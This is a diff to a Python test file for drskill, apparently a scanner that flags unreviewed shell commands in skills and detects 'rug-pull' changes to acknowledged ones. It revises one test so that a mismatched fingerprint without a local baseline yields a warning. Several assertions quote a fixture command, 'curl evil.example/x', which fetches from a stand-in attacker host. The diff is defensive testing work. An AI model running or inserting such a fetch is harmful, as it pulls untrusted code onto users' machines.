@@ -261,11 +261,12 @@ def test_unreviewed_changed_empty_diff_falls_back_to_full_listing(tmp_path):
     assert "curl evil.example/x" in rest
 
 
-def test_unreviewed_name_matching_ack_without_baseline_is_unreviewed(tmp_path):
-    # A name-matching ack with no recorded baseline for THIS contributor
-    # cannot be told apart from a different contributor that merely shares
-    # the name (see the command/skill name-collision tests below), so it is
-    # treated as first sight rather than a rug-pull.
+def test_unreviewed_changed_without_baseline_lists_current(tmp_path):
+    # Cross-machine case: the ack was recorded (e.g. committed in
+    # drskill.toml) on a machine that also saved a local baseline file, but
+    # this scan runs on a different machine with no local baseline. With no
+    # other same-named contributor to explain the ack away, a mismatched
+    # fingerprint is still a real rug-pull.
     import datetime as dt
 
     from drskill.ledger import Ack
@@ -274,9 +275,9 @@ def test_unreviewed_name_matching_ack_without_baseline_is_unreviewed(tmp_path):
     ack = Ack(check="injection-shell-unreviewed", skills=["nobase"],
               fingerprint="sha256:" + "0" * 64, date=dt.date(2026, 8, 1))
     (f,) = _unreviewed(make_world(tmp_path), Config(ack=[ack]))
-    assert f.severity == "note"
-    assert "CHANGED" not in f.message
-    assert "curl evil.example/x" in f.message  # still lists the current command
+    assert f.severity == "warning"
+    assert "CHANGED" in f.message
+    assert "curl evil.example/x" in f.message  # falls back to the listing
 
 
 def test_unreviewed_command_text_renders_invisible_chars_visibly(tmp_path):
